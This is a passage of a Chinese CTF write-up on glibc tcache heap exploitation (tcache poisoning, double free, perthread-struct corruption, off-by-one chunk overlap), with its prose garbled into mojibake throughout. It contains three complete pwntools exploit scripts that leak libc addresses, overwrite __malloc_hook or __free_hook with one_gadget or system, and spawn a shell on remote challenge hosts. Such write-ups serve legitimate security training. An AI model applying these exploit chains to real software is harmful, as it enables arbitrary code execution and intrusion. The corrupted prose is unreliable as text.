†å—æŒ‡é’ˆè¿›è¡Œä¿å­˜ï¼Œå¹¶åˆ¤æ–­è¯¥å¤§å°å¯¹åº”çš„Tcachebinæ˜¯å¦æœªæ»¡ï¼Œè‹¥æœªæ»¡åˆ™å°†å…¶ä¹‹åçš„å †å—æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—é“¾å…¥Tcachebinä¸­ï¼Œç›´åˆ°å¯¹åº”å¤§å°çš„Tcachebinæ”¾æ»¡æˆ–Fastbin/Smallbinçš„é“¾ä¸ºç©ºï¼Œæœ€åå°†ä¹‹å‰å–å‡ºçš„å †å—æŒ‡é’ˆè¿”å›ç»™ç”¨æˆ·ä½¿ç”¨ã€‚ç”±äºæ˜¯æŒ‰ç…§Fastbin/Smallbinçš„åˆ†é…é¡ºåºå°†å †å—æ”¾å…¥Tcachebinä¸­ï¼Œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„ã€‚ æ–‡å­—çœ‹ä¸æ‡‚ï¼ˆæˆ‘ä¹Ÿæ²¡çœ‹æ‡‚ orzï¼‰ï¼Ÿæ²¡å…³ç³»ï¼Œä¸Šä»£ç ã€‚ #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); return 0; } æ²¡é”™ï¼Œç”³è¯·äº†åä¸ªç›¸åŒå¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ï¼Œå…¶ä¸­cå¼€å¤´çš„æ˜¯æ”¾åˆ°tcache binsä¸­çš„ï¼Œfå¼€å¤´çš„æ˜¯tcacheæ»¡äº†ç„¶åè¢«æ”¾åˆ°äº†fastbinsé‡Œé¢ä¸­å»ã€‚ çœ‹ä¸€ä¸‹å†…å­˜åˆ†å¸ƒ ç„¶åæˆ‘ä»¬æ”¹ä¸€ä¸‹æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; int main() { void *c1,*c2,*c3,*c4,*c5,*c6,*c7,*f1,*f2,*f3; c1 = malloc(0x10); c2 = malloc(0x10); c3 = malloc(0x10); c4 = malloc(0x10); c5 = malloc(0x10); c6 = malloc(0x10); c7 = malloc(0x10); f1 = malloc(0x10); f2 = malloc(0x10); f3 = malloc(0x10); free(c1); free(c2); free(c3); free(c4); free(c5); free(c6); free(c7); free(f1); free(f2); free(f3); void *t1,*t2,*t3,*t4,*t5,*t6,*t7; void *a1,*a2,*a3; t1 = malloc(0x10); t2 = malloc(0x10); t3 = malloc(0x10); t4 = malloc(0x10); t5 = malloc(0x10); t6 = malloc(0x10); t7 = malloc(0x10); a1 = malloc(0x10); return 0; } æ€è·¯å°±æ˜¯æˆ‘ä»¬å°†tcachebinå¡«æ»¡ï¼Œç„¶åfree3æ¬¡åŒæ ·å¤§å°çš„chunkï¼Œå‘ç°è¿›å…¥åˆ°fastbiné‡Œé¢ï¼Œç„¶åæˆ‘ä»¬é€šè¿‡mallocå°†tcachebinå…¨éƒ¨æ¸…ç©ºï¼Œå¦‚ä¸‹å›¾ å¯ä»¥çœ‹åˆ°æ­¤æ—¶tcachebinå·²ç»ç©ºäº† fastbiné‡Œé¢æ˜¯è¿™æ ·çš„ ç„¶åå†mallocä¸€æ¬¡ï¼Œå‘ç°fastbinè¢«æ¸…ç©ºï¼Œå‰©ä½™çš„ä¸¤ä¸ªbinè¢«ç§»åˆ°tcachebiné‡Œé¢å» æœ¬æ¥æ˜¯350æŒ‡å‘330 ç§»å…¥åˆ°tcacheåå˜æˆäº†340(0x350 - 0x10)æŒ‡å‘äº†360 è¯æ˜äº†å‰æ–‡çš„ç»“è®ºï¼Œâ€œå› æ­¤ä¸éš¾åˆ¤æ–­ï¼Œæœ€ä»Tcachebinä¸­ç”³è¯·çš„å †å—é¡ºåºæ˜¯ä¸æ­£å¸¸ä»Fastbin/Smallbinä¸­ç”³è¯·å †å—é¡ºåºæ—¶åå‘çš„â€ã€‚ åˆ©ç”¨æ–¹æ³• è´´ä¸ªå¤§ä½¬æ€»ç»“çš„ï¼Œæˆ‘ä»”ç»†çœ‹äº†çœ‹è¿™å‡ ä¸ªæ–¹æ³•çš„è¯´æ˜ï¼Œæœ¬é¢˜ç›®åº”è¯¥ç”¨äº†ä»¥ä¸‹å‰ä¸‰ä¸ªæ¼æ´ï¼Œå…¶å®å«å•¥åä¸é‡è¦ï¼Œä¼šç”¨å°±è¡Œ~ Tcache poisoningï¼ˆtcache æŠ•æ¯’ï¼‰ åœ¨ä¸Šä¸€éƒ¨åˆ†ä¸­ä¹Ÿæåˆ°è¿‡è¿™ç§æ–¹æ³•ã€‚ä¸Fastbin Attackç±»ä¼¼ï¼Œç¯¡æ”¹Tcachebinä¸­çš„fdå­—æ®µï¼Œå¯¼è‡´åœ¨ç”³è¯·è¢«ç¯¡æ”¹å †å—åçš„ä¸‹ä¸€ä¸ªå †å—æ—¶èƒ½å¤Ÿç”³è¯·åˆ°ä»»æ„åœ°å€ã€‚ä¸Fastbinç›¸æ¯”ï¼ŒTcachebinä¸­ä¸ºäº†å¾—åˆ°æ›´é«˜çš„æ•ˆç‡è€Œèˆå»äº†å®‰å…¨æ€§ï¼Œåœ¨è¿›è¡Œç”³è¯·æ—¶æ²¡æœ‰å¯¹sizeä½è¿›è¡Œæ ¡éªŒï¼Œè€Œä¸”ç”±äºTcachebinä¸­çš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„fd(Fastbinçš„fdæ˜¯æŒ‡å‘ä¸‹ä¸€ä¸ªå †å—çš„å †å¤´)ï¼Œå› æ­¤æŒ‡å‘çš„åœ°å€å³æ˜¯ç”³è¯·åå†™æ•°æ®çš„åœ°å€ï¼Œä¸å†éœ€è¦å»è€ƒè™‘å †å¤´çš„åç§»ã€‚ Tcache dupï¼ˆï¼Ÿï¼Ÿï¼Ÿï¼‰ è¿™æ˜¯Tcacheæœºåˆ¶åˆšæ¨å‡ºçš„å‡ ä¸ªç‰ˆæœ¬ä¸­ï¼Œåœ¨è¿›è¡Œfreeæ“ä½œæ—¶æ²¡æœ‰å¯¹è¿™ä¸ªå †å—è¿›è¡Œä¸€ä¸ªå®‰å…¨æ£€æµ‹è€Œå¯¼è‡´å¯ä»¥å¯¹åŒä¸€ä¸ªå †å—è¿›è¡Œå¤šæ¬¡freeï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆä¸€ä¸ªTcachebiné“¾ä¸Šé“¾äº†ä¸¤ä¸ªç›¸åŒçš„å †å—(æˆ‘æŒ‡å‘æˆ‘è‡ªå·±)ï¼Œåé¢ä¹Ÿå°±ä¸ç”¨å¤šè¯´äº†ã€‚ä½†å€¼å¾—ä¸€æçš„æ˜¯åœ¨libc-2.29ç‰ˆæœ¬ä¸­åŠ å…¥äº†æ£€æŸ¥æœºåˆ¶(æºç çš„4201-4216è¡Œ)ï¼Œä¼šåœ¨å †å—è¿›è¡Œfreeæ—¶æ£€æŸ¥è¿™ä¸ªå †å—æ˜¯å¦å·²ç»å­˜åœ¨äºè¿™æ¡é“¾ä¸Šï¼Œå¦‚æœå­˜åœ¨åˆ™ä¼šæŠ¥&quot;free():double free detected in tcache 2&quot;çš„é”™è¯¯ï¼Œå› æ­¤è¿™ç§ç›´æ¥double freeåˆ©ç”¨æ–¹å¼å­˜åœ¨äºlibc-2.26è‡³libc-2.28çš„ç‰ˆæœ¬ä¸­ã€‚ Tcache perthread corruption ï¼ˆç»“æ„ä½“æ±¡æŸ“ï¼‰ åœ¨æœ€å¼€å§‹ä»‹ç»ç»“æ„ä½“æ—¶æåˆ°çš„tcache_perthread_structç»“æ„ä½“ï¼Œè¯¥ç»“æ„ä½“sizeä¸º0x250ï¼Œæ˜¯ç®¡ç†æ•´ä¸ªTcachebinçš„ç»“æ„ä½“ï¼Œå¦‚æœå¯¹è¿™ä¸ªç»“æ„ä½“æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆå¯ä»¥æ§åˆ¶ä»»æ„å¤§å°Tcachebinçš„å…¥å£åœ°å€ã€‚ U2Tï¼ˆç¿»è¯‘å›æ­»äº†ï¼‰ U2Tå³Unsortbin 2 Tcachebinï¼Œè¿™ç§å«æ³•æ˜¯åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°çš„ï¼Œä¹Ÿåªçœ‹åˆ°è¿‡ä¸€æ¬¡ï¼Œä¸»è¦æ˜¯é…åˆOff By Oneæˆ–Off By NULLçš„æ¼æ´ï¼Œä½¿Unsortbinåœ¨åˆå¹¶è¿‡ç¨‹ä¸­å°†ä¸­é—´çš„Tcachebinåˆå¹¶ï¼Œä»è€Œè¾¾åˆ°ä¿®æ”¹fdå­—æ®µçš„æ•ˆæœã€‚ é¢˜ç›® [V&amp;N2020 å…¬å¼€èµ›]easyTHeap é€†å‘ ç¨å¾®é€†ä¸€ä¸‹å°±å‘ç°äº†deleteçš„æ—¶å€™å­˜åœ¨UAFæ¼æ´ ä¸è¿‡å¿…é¡»è¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬åªèƒ½malloc 7æ¬¡ï¼Œfree 3æ¬¡ pwn it !!! è¿™é“é¢˜ä¿æŠ¤å…¨å¼€ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”»å‡»__malloc_hook æ€è·¯ï¼š 1ï¼Œæ”»å‡»__malloc_hookï¼Œå¿…é¡»è¦ä¼ªé€ chunkï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨tcacheçš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨ç»“æ„ä½“æ±¡æŸ“ï¼Œå°†tcache_perthread_structçš„æŒ‡é’ˆåŸŸæ”¹ä¸º__malloc_hooké™„è¿‘ 2ï¼Œæ±¡æŸ“ç»“æ„ä½“ï¼Œå¿…é¡»è¦èƒ½åˆ†é…åˆ°ç»“æ„ä½“ä¸Šï¼Œæˆ‘ä»¬å¯é€‰æ‹©double freeï¼Œä½†æ˜¯å‰æå¿…é¡»è¦çŸ¥é“ç»“æ„ä½“çš„åœ°å€ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨showæ¥æ³„æ¼åœ°å€ï¼Œmalloc(size),free(),free()ï¼Œè¿™æ ·è¯¥chunkå°±è®°å½•äº†è‡ªå·±çš„åœ°å€ï¼Œå‡å»0x250å°±æ˜¯ç»“æ„ä½“çš„åœ°å€ 3ï¼Œæ‰“one_gadgetï¼Œå¿…é¡»è¦çŸ¥é“libcåŸºåœ°å€ï¼Œæˆ‘ä»¬åˆ©ç”¨freeæ€çš„ç»“æ„ä½“å †å—ï¼ˆ0x250ä¼šè¿›å…¥unsorted binï¼‰ï¼Œæ³„æ¼main_arenaä¸Šæ–¹çš„__malloc_hookæ‹¿åˆ°åŸºåœ°å€ ä¸€ç§æ–¹æ³• å””â€¦â€¦ï¼Œæœ¬åœ°åªæœ‰2.28ç‰ˆæœ¬çš„libcï¼Œæ‰€ä»¥æœ¬åœ°ä¸å¯èƒ½æ‰“é€šï¼Œç®€å•å†™äº†ä¸€ä¸‹ï¼Œç„¶åone_gadgetå’Œæœ€åreallocè°ƒæ ˆæ¡¢çš„æ—¶å€™éƒ½æ˜¯æŠ„çš„åˆ«çš„å¸ˆå‚…çš„åç§»orz exp: from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',26169) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;================ step1:é€ƒé€¸tcache ==============&quot;) print(&quot;-------- åˆ©ç”¨double freeï¼Œå°†fd ptr å†™åˆ° tcacheå¤„ -------&quot;) add(0x50) #0 free(0) free(0) add(0x50) #1 show(1) leak_tcache = u64(p.recv(6) + b'\\00\\00') - 0x250 print(&quot;tcache is in :&quot; + hex(leak_tcache)) edit(1,p64(leak_tcache)) print('----- æ”¹å†™tcahcheç»“æ„ä½“ä¸­å †å—çš„æ•°é‡ï¼Œä½¿ä»¥åçš„chunkå¯ä»¥ä¸è¿›å…¥tcache -----') add(0x50) #2 add(0x50) #3 this is tcache_perthread_struct ä½†æ˜¯è¿™é‡Œçš„sizeä»ç„¶æ˜¯0x251 edit(3,b'a' * 0x30) print('================= step2:æ³„æ¼libc ==============') print('----- åˆ©ç”¨3å·å †å—ï¼ˆtcacheç»“æ„ä½“å †å—ï¼‰ï¼Œé‡Šæ”¾åè¿›å…¥unsorted binä¸­ï¼Œæ³„æ¼libc -----') free(3) show(3) leak_libc = u64(p.recv(6) + b'\\00\\00') - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc: 2.27 leak the address is 'main_arena + 96' print('the libcbase is :'+hex(leak_libc)) print('----- è·å¾—ä¸€äº›å‡½æ•°å’Œone gadgetçš„åœ°å€ ------') #one_gadget = [0x41982,0x419d6,0xdf882] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = leak_libc + one_gadget_list[1] malloc_hook = leak_libc + libc.symbols['__malloc_hook'] realloc_hook = leak_libc + libc.symbols['realloc'] print(&quot;================== step3: æ”»å‡» __malloc_hook ============&quot;) add(0x50) #4 edit(4, p64(0) * 9 + p64(malloc_hook - 0x13)) add(0x20) # fake chunk paylaod = b'A' * (0x13 - 0x8) + p64(one_gadget) + p64(realloc_hook + 8) edit(5, paylaod) add(0x20) p.interactive() å¦ä¸€ç§æ–¹æ³• ï¼ˆä¼¼ä¹è¿˜æœ‰åˆ«çš„æ–¹æ³•ï¼Œæˆ‘å†æƒ³æƒ³è¿˜èƒ½ä¸èƒ½ç”¨åˆ«çš„æ–¹æ³•åšå‡ºæ¥ï¼ˆé€ƒ ï¼‰ å¥½åƒåˆæ‰¾åˆ°äº†ä¸€ç§æ„é€ æ–¹å¼ï¼Œæœ¬è´¨æ€è·¯æ²¡æœ‰å˜ï¼Œç»†èŠ‚ç¨å¾®æ”¹åŠ¨äº†ä¸€ä¸‹ï¼Œæ¯”å¦‚æ³„æ¼libcæ¢æˆäº†0å·chunkï¼ˆå“ˆå“ˆå“ˆ from pwn import * ''' author : lemon libc_version: 2.27 ''' libc = ELF('./libc-2.27.so') local = 0 if local == 1: p = process('./vn_pwn_easyTHeap') else: p = remote('node3.buuoj.cn',27567) def dbg(): gdb.attach(p) def add(size): p.sendlineafter('choice: ','1') p.sendlineafter('size?',str(size)) def edit(index,content): p.sendafter('choice: ','2') p.recvuntil('idx?') p.sendline(str(index)) p.recvuntil('content:') p.send(content) def show(index): p.sendafter('choice: ','3') p.recvuntil('idx?') p.sendline(str(index)) def free(index): p.sendafter('choice: ','4') p.recvuntil('idx?') p.sendline(str(index)) print(&quot;============ step 1: é€ƒé€¸tcache bin ===========&quot;) add(0x100) #0 add(0x10) #1 protect 0 free(0) free(0) show(0) tcache_perthread_struct = u64(p.recv(6).ljust(8,b'\\00')) - 0x250 add(0x100) #2 (0) edit(2,p64(tcache_perthread_struct)) add(0x100) #3 add(0x100) #4 tcache_perthread_struct payload = b'\\07' * 0x40 edit(4,payload) print(&quot;=========== step 2: æ³„æ¼libc ============&quot;) free(0) show(0) libc_base = u64(p.recv(6).ljust(8,b'\\00')) - 96 - 0x10 - libc.symbols['__malloc_hook'] #libc_base = u64(p.recv(6).ljust(8,b'\\x00'))-(0x7f5c5654cca0-0x7f5c56182ab0) print('libc base:' + hex(libc_base)) __malloc_hook = libc_base + libc.symbols['__malloc_hook'] __libc_realloc = libc_base + libc.symbols['__libc_realloc'] one_gadget_list = [0x4f2c5,0x4f322,0x10a38c] one_gadget = libc_base + one_gadget_list[1] print(&quot;=========== step 3: one_gadget ===========&quot;) payload = b'\\00' * 0x40 + p64(0) * 2 + p64(__malloc_hook-0x20) edit(4,payload) add(0x30) #5 payload_one_gadget = b'A' * (0x15 - 0x8) + b'B' * (0x13 - 0x8) + p64(one_gadget) + p64(__libc_realloc + 8) edit(5,payload_one_gadget) add(0x20) #è§¦å‘one_gadget p.interactive() tcache é€†å‘ mainå‡½æ•° addå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¯ä»¥åˆ›å»º20ä¸ªchunkï¼Œå¹¶ä¸”æˆ‘ä»¬ä¸èƒ½æ§åˆ¶sizeï¼Œmallocçš„é»˜è®¤sizeæ˜¯0x30 showå‡½æ•° deleteå‡½æ•° editå‡½æ•°ï¼Œå¯ä»¥å¾ˆè½»æ˜“çš„å‘ç°æ¼æ´ç‚¹ä½äºeditï¼Œæˆ‘ä»¬èƒ½å¤Ÿç¼–è¾‘0x40å¤§å°çš„chunkï¼Œå¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªchunkçš„sizeåŸŸ æ€è·¯ï¼šç”±äºç¨‹åºä¿æŠ¤å…¨å¼€ï¼Œæˆ‘ä»¬å¿…é¡»è¦æ³„æ¼åœ°å€ï¼Œè€ƒè™‘åˆ°æˆ‘ä»¬èƒ½å¤Ÿç”³è¯·è¾ƒå¤§æ•°é‡çš„chunkï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ å‡ºä¸€ä¸ªè¾ƒå¤§sizeçš„unsorted binç»•è¿‡tcache binï¼Œç”¨æ¥æ³„æ¼åœ°å€ã€‚ä½†æ˜¯æˆ‘ä»¬å¿…é¡»å¾—é€šè¿‡ç›¸å…³æ£€æŸ¥ï¼Œåä¸€ä¸ªchunkå¿…é¡»å®Œæ•´ï¼Œè¿™ä¸€ç‚¹ç»è¿‡è°ƒè¯•å¯ä»¥æ„é€ å‡ºç›¸å…³åˆç†çš„sizeï¼ˆé€šè¿‡æº¢å‡º0x10å­—èŠ‚ï¼‰ æ³„æ¼å®Œåœ°å€ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ‰“__free_hookï¼Œæˆ‘ä»¬è™½ç„¶æ²¡æœ‰UAFæ¼æ´ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨unsorted binæ„æˆä¸€ä¸ªç±»ä¼¼äºUAFçš„æ¼æ´ã€‚å› ä¸ºæˆ‘ä»¬ä¹‹å‰æ„é€ å‡ºä¸€ä¸ªunsorted binï¼Œåœ¨freeä¹‹å‰è®°ä¸º1å·chunkï¼Œæˆ‘ä»¬å¯ä»¥malloc()ä¸€ä¸ªå—ï¼Œè¿™æ—¶è¿™ä¸ªå—çš„idå°±ä¸º1ï¼Œå†mallocä¸€ä¸ªå—ï¼Œè®°ä¸ºxï¼Œå› ä¸ºxåœ¨ä¹‹å‰å·²ç»æœ‰æŒ‡é’ˆäº†ï¼Œè®°ä¸ºx1ï¼Œæˆ‘ä»¬å†æ¬¡ç”³è¯·ï¼Œå°±ä¼šä»unsorted binä¸­ç»™æˆ‘ä»¬åˆ‡ä¸‹æ¥ä¸€å—ï¼Œè¿™ä¸ªæ–°æŒ‡é’ˆè®°ä¸ºx2ï¼Œè¿™æ ·x1ï¼Œx2éƒ½æŒ‡å‘äº†åŒä¸€ä¸ªå—ï¼Œè¾¾æˆäº†ä¸€ä¸ªâ€œUAFâ€ï¼Œæˆ‘ä»¬freeæ‰x1ï¼Œç¼–è¾‘x2ï¼Œå°±å¯ä»¥æ”»å‡»æˆåŠŸã€‚ exp exp: from pwn import * local = 1 if local == 1: p = process('./tcache') else: p = remote('chall.pwnable.tw',10304) #elf = ELF('./bookwriter') libc = ELF('/glibc/2.28/64/lib/libc.so.6') def dbg(): context.log_level = 'debug' def add(content): p.sendlineafter('4. Show String','1') p.sendafter('Input your content:',content) def show(index): p.sendlineafter('4. Show String','4') p.sendafter('Select string:',str(index)) def edit(index,content): p.sendlineafter('4. Show String','2') p.sendafter('Select string:',str(index)) p.sendafter('Input your content:',content) def delete(index): p.sendlineafter('4. Show String','3') p.sendafter('Select string:',str(index)) for i in range(19): add('A') payload = p64(0) * 7 + p64(0x441) edit(0,payload) delete(1) payload1 = 0x40 * b'A' edit(0,payload1) show(0) p.recvuntil(b'A' * 64) libc_base = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8,b'\\x00')) - 96 - 0x10 - libc.sym['__malloc_hook'] print(&quot;[*] libc_base --&gt; &quot;,hex(libc_base)) __free_hook = libc_base + libc.sym['__free_hook'] print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook)) system_addr = libc_base + libc.sym['system'] edit(0,payload) add('/bin/sh;') #chunk1 add('AAAAAAAA') #chunk19 == chunk2 delete(4) delete(2) edit(19,p64(__free_hook)) add(p64(system_addr)) add(p64(system_addr)) delete(1) p.interactive() ","link":"https://l3mon629.github.io/post/vandn2020-gong-kai-sai-easytheap/"},{"title":"[V&N2020 å…¬å¼€èµ›]simpleHeap","content":"é€šè¿‡è¿™ä¸ªé¢˜ç›®æ¥å­¦ä¹  off-by-one ä»€ä¹ˆæ˜¯off by one(null) ? å®šä¹‰æˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œç›´æ¥è¯´æˆ‘çš„ç†è§£ã€‚å°±æ˜¯é‚£ç§åœ¨ç”¨æˆ·è¾“å…¥æ—¶ï¼Œä¸€ä¸ªå¾ªç¯å¤„ç†è¾¹ç•Œé—®é¢˜æˆ–è€…æ˜¯æ•°ç»„è¶Šç•Œï¼Œå¯¹æˆ‘ä»¬çš„è¾“å…¥æ²¡æœ‰å¾ˆå¥½çš„å¤„ç†ï¼Œå°±ä¼šå¯¼è‡´ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼ˆæˆ–è€…æ˜¯strcpyå¤„ç†ä¸å½“ï¼‰ã€‚ åˆ©ç”¨off-by-one æœ‰å¸ˆå‚…å–œæ¬¢å«off-by-one ä¸ºä¸€ä¸ªå­—èŠ‚çš„å·æ¸¡æ”»å‡» ç»™æ”»å‡»è€…å‘æŒ¥çš„æ”»å‡»ç©ºé—´ä¹Ÿåªæœ‰ä¸€ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥åˆ©ç”¨æ–¹å¼è¿˜æ˜¯æœ‰ä¸€å®šé™åˆ¶çš„ æˆ‘ä»¬æœ€å¸¸åˆ©ç”¨çš„ï¼ˆæˆ–è®¸æ˜¯ï¼‰æ‰‹æ³•æ˜¯ å †å—é‡å ï¼ˆchunk extendï¼‰ï¼Œè·Ÿæˆ‘ä¹‹å‰è®²è¿‡çš„â€œå †å—æ€€å­•â€æœ¬è´¨æ˜¯ä¸€ä¸ªä¸œè¥¿ï¼Œchunk extend çš„åˆ©ç”¨æ¡ä»¶å¦‚ä¸‹ï¼š 1ï¼Œèƒ½å¤Ÿè¿›è¡Œå †ç©ºé—´çš„å¸ƒå±€ï¼ˆå³å†™å…¥ä¹‹ç±»çš„åŠŸèƒ½ï¼‰ 2ï¼Œè‡³å°‘èƒ½å¤Ÿæº¢å‡ºä¸€ä¸ªå­—èŠ‚ å…¶ä¸­ç¬¬äºŒä¸ªæ¡ä»¶æ­£å¥½ç¬¦åˆoff-by-oneçš„æƒ…æ™¯ åˆ©ç”¨è¿‡ç¨‹ï¼šoff-by-one + chunk extend ç”±äºæœ¬äººæ°´å¹³æœ‰é™ï¼ˆwtcl orz æ‰€ä»¥å°±ä¸¾ä¸¤ä¸ªä¾‹å­å¥½äº†ï¼Œä¸€ä¸ªæ˜¯å¼€å¯äº†Full RELROï¼Œä¸€ä¸ªæ²¡å¼€å¯ gotè¡¨æ— é˜²æŠ¤çš„åˆ©ç”¨æƒ…æ™¯ æ—¢ç„¶gotè¡¨æ— é˜²æŠ¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºæ¥æ”¹å†™gotè¡¨ï¼Œçœ‹è¯¦ç»†çš„cä»£ç ï¼š #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;stdint.h&gt; #include &lt;malloc.h&gt; int main() { void *p,*q1,*r1,*q2,*r2,*got; p = malloc(0x18); //index 0 q1 = malloc(0x20); //index 1 r1 = malloc(0x30); //index 2 memset(p+0x18,0x71,0x1); free(q1); free(r1); q2 = malloc(0x60); memset(q2+0x30,'A',0x8); r2 = malloc(0x30); got = malloc(0x30); return 0; } æ€è·¯æ˜¯ç”³è¯·ä¸‰ä¸ªchunkï¼Œå¤§å°åˆ†åˆ«ä¸º0x18,0x20,0x30 ç¬¬ä¸€ä¸ªchunkç”¨æ¥å‡ºå‘off-by-one æ¼æ´ï¼Œç¬¬äºŒä¸ªchunkç”¨æ¥æ„ç­‘å †å—é‡å ï¼Œç¬¬ä¸‰ä¸ªchunkç”¨æ¥æ„ç­‘ fake chunkï¼Œæˆ‘ä»¬åˆ©ç”¨ç¬¬ä¸€ä¸ªchunkæº¢å‡ºä¸€å­—èŠ‚æ¥æ”¹å†™ç¬¬äºŒä¸ªchunkçš„sizeä½ï¼Œç„¶åå°†ç¬¬ä¸‰ä¸ªchunkæ¥åŒ…å«è¿›å»ï¼Œç„¶åfreeä¸¤æ¬¡ï¼Œåœ¨mallocä¸€æ¬¡ï¼Œæ‹¿åˆ°big chunkçš„æ§åˆ¶æƒï¼Œé€šè¿‡å‘big chunké‡Œå†™å…¥å†…å®¹ï¼Œæ”¹å†™free small chunkçš„fd pointer(æ­¤æ—¶smaller chunkè¿˜æ˜¯freeæ€)ï¼Œæ¥ç€mallocä¸¤æ¬¡ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ‹¿åˆ°ä¸€ä¸ªfake chunkï¼Œå¦‚æœfake chunkä½äºgotè¡¨é™„è¿‘ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥åŠ«æŒgotè¡¨é¡¹ç»§è€Œæ‹¿åˆ°shell æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹å…·ä½“çš„è°ƒè¯•è¿‡ç¨‹ã€‚ mallocæ‹¿åˆ°ä¸‰ä¸ªå †å—ï¼š äººä¸ºæ„é€ ä¸€ä¸ªoff-by-oneæ¥æº¢å‡ºä¸€å­—èŠ‚ï¼š freeä¸¤æ¬¡ï¼Œå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ”¹å†™åçš„chunkå·²ç»å˜æˆäº†freeæ€ï¼š é€šè¿‡å‘big chunké‡Œå†™å†…å®¹å¯ä»¥æ”¹å†™fd pointerï¼Œå¯ä»¥çœ‹åˆ°2å·chunkçš„pointerå·²ç»å˜æˆäº†â€˜AAAAâ€™â€¦â€¦ è¿™ä¸ªä¾¿æ˜¯åŠ«æŒgotè¡¨çš„æµç¨‹ got è¡¨ä¸å¯å†™ï¼š å¯¹äºgotè¡¨é¡¹ä¸å¯å†™çš„elfï¼Œæˆ‘ä»¬å¯ä»¥å€Ÿé‰´fastbin attackçš„æ€è·¯æ¥æ”»å‡»__malloc_hookå‡½æ•°ï¼Œå°†__malloc_hookå‡½æ•°æ”¹å†™æˆone_gadgetï¼Œè§¦å‘mallocæ‹¿shell æ€è·¯å¾ˆç®€å•ï¼Œå¤§ä½“æ€è·¯å’Œä¸Šé¢ä¸€æ ·ï¼Œç„¶åä¸‰å·chunkçš„fd pointerå¯ä»¥å†™æˆ__malloc_hook+23çš„ä½ç½®ï¼ˆå­—èŠ‚é”™ä½ï¼Œå…·ä½“åŸå› ä¸å†èµ˜è¿°ï¼‰ï¼Œç„¶åå°†__malloc_hookæ”¹å†™å³å¯ï¼Œæ³¨æ„çš„æ˜¯ï¼Œä¸ºäº†è¾¾åˆ°fastbin attackçš„ç›®çš„ï¼Œæˆ‘ä»¬3å·å—çš„memå¤§å°å¿…é¡»æ˜¯0x60ï¼Œå› ä¸ºè¦æŠŠ0x7fçš„fake chunké“¾æ¥åœ¨åŒä¸€ä¸ªbinä¸­ é¢˜ç›®è§£æï¼š é€†å‘è¿‡ç¨‹ï¼š ä»£ç é‡å°šå¯ï¼Œoff-by-oneçš„æ¼æ´è¿˜æ˜¯æœ‰ä¸€å®šéšç§˜æ€§çš„ï¼Œå…·ä½“çš„é€†å‘åˆ†æä¸å†èµ˜è¿° æ³¨æ„ä¸¤ä¸ªç‚¹å³å¯ï¼š ç¬¬ä¸€ï¼Œæœ¬ç¨‹åºä¸å­˜åœ¨UAFæ¼æ´ï¼Œå³deleteå‡½æ•°ä¸­å¯¹freeçš„chunkå¤„ç†çš„å¾ˆå¥½ï¼ŒæŠŠfreeæ€çš„æŒ‡é’ˆæ•°æ®éƒ½ç»™æ¸…ç©ºäº† ç¬¬äºŒï¼Œå°±æ˜¯off-by-oneçš„äº§ç”Ÿçš„ä½ç½® 